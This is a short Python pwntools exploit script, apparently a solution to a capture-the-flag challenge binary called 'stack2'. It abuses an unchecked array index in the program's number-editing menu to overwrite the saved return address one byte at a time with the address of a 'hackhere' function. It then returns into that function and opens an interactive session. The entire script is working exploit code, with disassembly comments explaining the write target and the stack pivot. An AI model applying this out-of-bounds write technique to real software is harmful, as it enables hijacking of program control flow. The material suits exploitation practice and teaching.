
from pwn import *
 
r = process('./stack2')

hackhere = 0x0804859B

r.recvuntil(b'have:\n')
r.sendline(b'1')
r.readline()
r.sendline(b'1')

# setting array
# 0x804884d <main+637>       mov    BYTE PTR [ebp+eax*1-0x70], dl

# setting ESP 
# 0x080488ee <+798>:	leave  
# 0x080488ef <+799>:	lea    esp,[ecx-0x4]
# 0x080488f2 <+802>:	ret 

for i in range(4):
    r.recvuntil(b'exit\n')
    r.sendline(b'3')
    r.readline()
    r.sendline(f'{132+i}')
    r.readline()
    r.sendline(f'{hackhere & 0xff}')
    hackhere >>= 8

r.sendline(b'5')

r.interactive()
